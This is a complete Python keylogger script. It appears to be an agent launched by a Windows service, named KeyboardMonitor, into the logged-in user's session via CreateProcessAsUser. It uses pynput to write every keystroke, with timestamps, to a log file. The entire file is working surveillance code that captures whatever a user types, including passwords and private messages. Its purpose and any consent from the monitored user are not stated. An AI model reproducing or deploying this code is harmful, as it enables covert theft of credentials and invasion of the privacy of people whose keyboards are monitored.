"""
Standalone keylogger agent.

This script is spawned by KeyboardMonitor into the active interactive user
session (via CreateProcessAsUser) so that pynput can reach the user's
keyboard input – something that is not possible from Session 0 directly.

Usage:
    python keylogger_agent.py <path_to_log_file>
"""

import os
import sys
import logging
from datetime import datetime

from pynput import keyboard


def main() -> None:
    if len(sys.argv) < 2:
        print("Usage: keylogger_agent.py <log_file_path>", file=sys.stderr)
        sys.exit(1)

    log_file = sys.argv[1]
    os.makedirs(os.path.dirname(os.path.abspath(log_file)), exist_ok=True)
    diag_log = (
        sys.argv[2]
        if len(sys.argv) >= 3
        else os.path.join(os.path.dirname(os.path.abspath(log_file)), "keyboard_agent.log")
    )
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)-8s %(name)s - %(message)s",
        handlers=[logging.FileHandler(diag_log, encoding="utf-8")],
    )
    logger = logging.getLogger("keyboard_agent")
    logger.info("Keyboard agent starting")

    # Keep the log file open for the lifetime of the listener to avoid the
    # overhead of open/close on every keypress.
    try:
        with open(log_file, "a", encoding="utf-8") as fh:
            def on_press(key: keyboard.Key) -> None:
                if hasattr(key, "char") and key.char is not None:
                    char = key.char
                elif hasattr(key, "name"):
                    char = f"[{key.name}]"
                else:
                    char = str(key)
                entry = f"{datetime.now().isoformat()} {char}\n"
                try:
                    fh.write(entry)
                    fh.flush()
                except OSError as exc:
                    logger.exception("Failed writing keyboard event: %s", exc)

            with keyboard.Listener(on_press=on_press) as listener:
                logger.info("Keyboard listener started")
                listener.join()
    except Exception:
        logger.exception("Keyboard agent crashed")
        raise


if __name__ == "__main__":
    main()
